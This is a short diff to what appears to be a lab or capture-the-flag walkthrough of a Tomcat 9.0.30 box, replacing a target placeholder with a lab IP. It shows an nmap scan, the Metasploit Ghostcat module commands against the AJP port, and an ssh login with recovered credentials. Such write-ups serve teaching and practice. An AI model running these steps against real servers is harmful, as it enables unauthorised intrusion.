@@ -9,7 +9,7 @@ Linux machine running Apache Tomcat 9.0.30 with the AJP connector exposed. The a
 ### Network Scanning
 
 ```bash
-nmap -sC -sV -p- <target_ip>
+nmap -sC -sV -p- 10.64.148.209
 ```
 
 Open ports:
@@ -32,7 +32,7 @@ Ghostcat is a file read/inclusion vulnerability in the AJP connector that allows
 ```bash
 msfconsole
 use auxiliary/admin/http/tomcat_ghostcat
-set RHOSTS <target_ip>
+set RHOSTS 10.64.148.209
 set RPORT 8009
 run
 ```
@@ -82,7 +82,7 @@ Enter passphrase `alexandru` when prompted. Output contains credentials for user
 ## Lateral Movement
 
 ```bash
-ssh merlin@<target_ip>
+ssh merlin@10.64.148.209
 ```
 
 ---
